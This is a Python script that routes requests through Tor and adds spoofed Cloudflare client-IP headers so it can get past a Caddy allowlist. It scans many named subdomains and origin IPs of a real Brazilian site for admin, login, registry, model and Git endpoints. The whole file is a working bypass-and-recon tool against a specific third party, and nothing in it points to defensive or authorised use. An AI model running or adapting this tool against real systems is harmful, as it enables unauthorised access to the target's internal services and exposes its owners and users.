#!/usr/bin/env python3
"""Advanced origin probe with CF header spoofing to bypass Caddy's CF-IP allowlist.
Many Caddy configs block direct origin access unless request appears to come from CF."""
import socket, ssl, sys, json, time, re
import socks
from concurrent.futures import ThreadPoolExecutor, as_completed

SOCKS_HOST, SOCKS_PORT = "127.0.0.1", 9050
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4467.114 Safari/537.36"

# CF IP ranges (use a real CF IP as spoofed source)
CF_IPS = ["172.71.0.1", "104.28.0.1", "172.68.0.1", "162.158.0.1"]

# Targets that returned 403 from Caddy on direct origin probe — retry with CF headers
TARGETS_403 = [
    ("201.54.0.48", 443, "drive.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "cloudreve.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "registry.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "rag.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "litellm.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "mcp-auth.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "grafana.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "gitlab.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "n8n.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "redash.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "plataforma.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "study-plan-tracker.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "zipcode.dsoconcursos.com.br"),
    ("3.83.108.124", 443, "mcp-aws.dsoconcursos.com.br"),
    # also try ones that returned 307 (portal) and 404 (api)
    ("201.54.0.48", 443, "portal.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "api.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "suporte.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "prf.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "pf.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "premium.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "tutoryplans.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "uptime.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "tei.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "www.dsoconcursos.com.br"),
    ("201.54.0.48", 443, "dsoconcursos.com.br"),
    ("3.83.108.124", 443, "mcp-auth.dsoconcursos.com.br"),
    ("3.83.108.124", 443, "tools-executor.dsoconcursos.com.br"),
    ("3.83.108.124", 443, "litellm.dsoconcursos.com.br"),
    ("3.83.108.124", 443, "registry.dsoconcursos.com.br"),
    ("3.83.108.124", 443, "drive.dsoconcursos.com.br"),
    ("3.83.108.124", 443, "rag.dsoconcursos.com.br"),
    ("3.83.108.124", 443, "api.dsoconcursos.com.br"),
]

PATHS = ["/", "/login", "/v1/models", "/v2/", "/v2/_catalog", "/api/health", "/health",
         "/ready", "/swagger", "/docs", "/api/v1", "/status", "/admin", "/login.php"]

def probe(args):
    ip, port, host, path, cf_ip = args
    try:
        s = socks.socksocket()
        s.set_proxy(socks.SOCKS5, SOCKS_HOST, SOCKS_PORT)
        s.settimeout(12)
        s.connect((ip, port))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {UA}\r\n"
               f"Accept: */*\r\nCF-Connecting-IP: {cf_ip}\r\n"
               f"X-Forwarded-For: {cf_ip}\r\nX-Real-IP: {cf_ip}\r\n"
               f"True-Client-IP: {cf_ip}\r\nConnection: close\r\n\r\n")
        s.sendall(req.encode())
        chunks=[]
        total=0
        while True:
            try: d=s.recv(8192)
            except: break
            if not d: break
            chunks.append(d); total+=len(d)
            if total>128*1024: break
        s.close()
        raw=b"".join(chunks)
    except Exception as e:
        return (ip,host,port,path,cf_ip,None,str(e)[:60],None,0,[])
    head,_,body = raw.partition(b"\r\n\r\n")
    hs = head.decode("latin1",errors="ignore")
    status=None; server=None; loc=None
    for line in hs.split("\r\n"):
        if line.startswith("HTTP/"):
            m=re.match(r"HTTP/\S+\s+(\d+)",line)
            if m: status=m.group(1)
        m=re.match(r"Server:\s*(.+)",line,re.I)
        if m: server=m.group(1).strip()
        m=re.match(r"Location:\s*(.+)",line,re.I)
        if m: loc=m.group(1).strip()[:120]
    title=None
    tm=re.search(r"<title[^>]*>([^<]*)</title>", body.decode("latin1",errors="ignore"), re.I)
    if tm: title=tm.group(1).strip()[:120]
    return (ip,host,port,path,cf_ip,status,server,title,len(body),[l for l in hs.split("\r\n")[:12]])

def main():
    tasks=[]
    for ip,port,host in TARGETS_403:
        for path in ["/","/login","/v1/models","/v2/","/v2/_catalog","/health","/docs","/swagger","/admin","/api/"]:
            for cf_ip in CF_IPS[:1]:  # use first CF IP only for speed
                tasks.append((ip,port,host,path,cf_ip))
    print(f"[*] {len(tasks)} tasks (CF-spoof)", file=sys.stderr)
    results=[]
    with ThreadPoolExecutor(max_workers=24) as ex:
        futs=[ex.submit(probe,t) for t in tasks]
        for f in as_completed(futs):
            r=f.result()
            results.append(r)
            ip,host,port,path,cf_ip,status,server,title,size,hdrs=r
            if status and status not in ("000",None,"403"):
                print(f"[!!] {ip}:{port} {host}{path} CF={cf_ip} -> {status} srv={server} t={title!r} sz={size} loc={hdrs}")
    with open("raw/httpx_cfspoof_raw.json","w") as f:
        json.dump([{"ip":r[0],"host":r[1],"port":r[2],"path":r[3],"cf_ip":r[4],
                    "status":r[5],"server":r[6],"title":r[7],"size":r[8],"headers":r[9]} for r in results], f, indent=2)
    print("\n=== NON-403 responses (CF spoof helped) ===")
    for r in sorted(results, key=lambda x:(x[1],x[3])):
        if r[5] and r[5] not in ("000",None,"403"):
            print(f"{r[0]}:{r[2]} {r[1]}{r[3]} CF={r[4]} -> {r[5]} | srv={r[6]} | t={r[7]!r} | sz={r[8]}")
            for h in r[9][:10]:
                print(f"    {h}")
            print()

if __name__=="__main__":
    main()
